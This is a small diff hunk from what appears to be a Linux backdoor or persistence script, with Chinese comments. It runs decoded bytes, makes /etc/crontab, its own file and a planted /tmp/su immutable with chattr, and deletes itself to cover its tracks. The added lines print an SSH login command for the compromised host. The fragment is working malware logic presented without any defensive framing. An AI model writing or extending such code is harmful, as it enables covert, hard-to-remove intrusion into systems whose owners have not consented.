@@ -155,4 +155,6 @@ run_code(decoded_bytes)
     ml('chattr +i /etc/crontab')
     ml('chattr +i ' + file_path)
     ml('chattr +i /tmp/su')
+    user = ml('whoami').strip()
+    print('------>连接命令为:ssh ' + str(user) + '@ip -p ' + str(port) + '<------')
     delete_current_script()  # 删除当前执行脚本文件
